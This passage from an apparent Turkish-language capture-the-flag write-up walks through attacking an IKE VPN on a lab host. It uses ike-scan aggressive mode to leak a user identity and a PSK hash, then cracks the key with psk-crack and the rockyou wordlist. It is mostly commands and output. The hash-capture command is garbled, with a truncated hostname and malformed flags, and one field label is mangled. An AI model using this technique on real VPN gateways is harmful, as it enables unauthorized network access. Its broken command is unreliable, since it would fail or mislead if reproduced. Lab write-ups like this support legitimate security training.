


```bash
ike-scan -A expressway.htb 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=815a525d02e4b1ad) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.099 seconds (10.11 hosts/sec).  1 returned handshake; 0 returned notify
```

Agresif Moddan Önemli Bulgular:
1. Kimlik Açıkladı:

    ID_TYPEID_TÜMÜZ : ID_USER_FQDN
    ID_VALUE : ike@expressway.htb

2. Alan Adı Bilgisi:

    Domain : expressway.htb
    Kullanıcı adı : ike(veya bu bir hizmet hesabı olabilir)

Hash bir dosyaya kaydedildi (`ike.psk`)

```bash
sudo ike-scan -A pressway.htb — id=ike@expressway.htb - Pike.psk
```


```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk

key "freakingrockstarontheroad" 
```


